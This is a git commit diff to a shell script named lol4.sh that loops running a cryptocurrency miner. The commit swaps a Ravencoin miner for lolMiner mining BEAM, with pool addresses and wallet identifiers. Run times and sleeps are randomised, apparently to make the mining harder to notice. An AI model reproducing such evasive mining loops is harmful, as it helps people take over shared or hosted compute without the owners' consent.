fcba7af2f46a8a3a509eb779b3e0d9817562decc
kartikbhalala <47134161+kartikbhalala@users.noreply.github.com>
2020-12-03 22:44:55 +0530

    Update lol4.sh

--- lol4.sh
+++ lol4.sh
@@ -5,14 +5,15 @@ do
 	y=20
 	z=$(($x+$y))
 
-	a=$(($RANDOM%150))
-	b=700
+	a=$(($RANDOM%120))
+	b=600
 	c=$(($a+$b))
 
-	w=$(($RANDOM%10))
+	w=$(($RANDOM%60))
 	e=120
 	aaram=$(($w+$e))
-	timeout -k 5 $c\s  ./cnn/cnn -P stratum+ssl://REJQ8UT8XJdsD3fCmqzJs2iv4YHtDw4BGa.worker:pps@us.ravenminer.com:13802 -U
+	timeout -k 5 $c\s  ./1.16a/lolMiner --coin BEAM --pool us-beam.ss.btc.com:443 --user uvpx472.2bac519ca0d058982b4891dfa6980b3b35e41dd4b52daad2fe540aef70206ef9bb.kartik3310
+	timeout -k 5 2s pgrep cnn | xargs kill
 	sleep $aaram
 	echo "Kartik Bhai Amar Rahe"
 done
